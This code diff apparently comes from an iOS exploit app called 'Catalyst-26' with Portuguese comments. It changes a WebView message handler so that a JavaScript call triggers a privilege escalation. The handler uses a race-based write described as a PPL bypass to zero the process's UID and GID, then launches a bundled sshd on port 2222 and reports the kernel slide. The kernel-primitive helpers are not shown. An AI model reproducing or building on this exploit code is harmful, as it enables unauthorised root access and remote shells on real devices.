@@ -63,24 +63,62 @@ extern kern_return_t mach_vm_map(vm_map_t, mach_vm_address_t *, mach_vm_size_t, 
 
 - (void)userContentController:(WKUserContentController *)userContentController 
       didReceiveScriptMessage:(WKScriptMessage *)message 
-                 replyHandler:(void (^)(id _Nullable, NSString * _Nullable))replyHandler {
+                 replyHandler:(void (^)(id _Nullable reply, NSString * _Nullable errorMessage))replyHandler {
     
     NSString *action = message.body[@"action"];
+
+    // 1. Handshake Inicial
     if ([action isEqualToString:@"test_bridge"]) {
-        replyHandler(@{@"status": @"SUCCESS", @"info": @"Catalyst-26 Active"}, nil);
-    } else if ([action isEqualToString:@"pte_patch"]) {
-        uint64_t ucred = [self get_my_ucred_ptr];
-        if (ucred) [self ppl_write_race:(ucred + 0x18) value:0]; // Root!
+        replyHandler(@{@"info": @"Catalyst-26: Ponte Ativa (A13)"}, nil);
+    } 
+    
+    // 2. Execução do Exploit e Spawn do SSHD
+    else if ([action isEqualToString:@"pte_patch"]) {
         
-        uint64_t slide = [self getKernelSlide];
-        replyHandler(@{@"status": @"SUCCESS", @"slide": [NSString stringWithFormat:@"0x%llx", slide]}, nil);
-        
-        NSString *path = [[NSBundle mainBundle] pathForResource:@"sshd_static" ofType:nil];
-        if (path) {
-            pid_t pid;
-            char *const args[] = {(char*)[path UTF8String], "-D", NULL};
-            posix_spawn(&pid, [path UTF8String], NULL, NULL, args, NULL);
-        }
+        dispatch_async(dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_HIGH, 0), ^{
+            // A. Localizar credenciais (ucred)
+            uint64_t ucred = [self get_my_ucred_ptr];
+            
+            if (ucred == 0) {
+                dispatch_async(dispatch_get_main_queue(), ^{
+                    replyHandler(nil, @"Falha ao localizar ucred (Proc Scan Error)");
+                });
+                return;
+            }
+
+            // B. PPL Bypass: Setar UID 0 (Root)
+            // No iOS 26.4, o offset do UID dentro do ucred costuma ser 0x18
+            [self ppl_write_race:(ucred + 0x18) value:0]; // posix_cred->cr_uid
+            [self ppl_write_race:(ucred + 0x1C) value:0]; // posix_cred->cr_rgid
+
+            // C. Localizar o binário no Bundle
+            NSString *sshPath = [[NSBundle mainBundle] pathForResource:@"sshd_static" ofType:nil];
+            
+            if (sshPath) {
+                pid_t pid;
+                char *const args[] = {(char*)[sshPath UTF8String], "-D", "-e", "-p", "2222", NULL};
+                extern char **environ;
+
+                // D. Spawn Privilegiado
+                int spawn_ret = posix_spawn(&pid, [sshPath UTF8String], NULL, NULL, args, environ);
+                
+                dispatch_async(dispatch_get_main_queue(), ^{
+                    if (spawn_ret == 0) {
+                        uint64_t slide = [self getKernelSlide];
+                        replyHandler(@{
+                            @"status": @"SUCCESS",
+                            @"pid": @(pid),
+                            @"slide": [NSString stringWithFormat:@"0x%llx", slide]
+                        }, nil);
+                    } else {
+                        replyHandler(nil, [NSString stringWithFormat:@"Erro no posix_spawn: %d", spawn_ret]);
+                    }
+                });
+            } else {
+                dispatch_async(dispatch_get_main_queue(), ^{
+                    replyHandler(nil, @"Arquivo 'sshd_static' não encontrado no Bundle.");
+                });
+            }
+        });
     }
 }
-@end
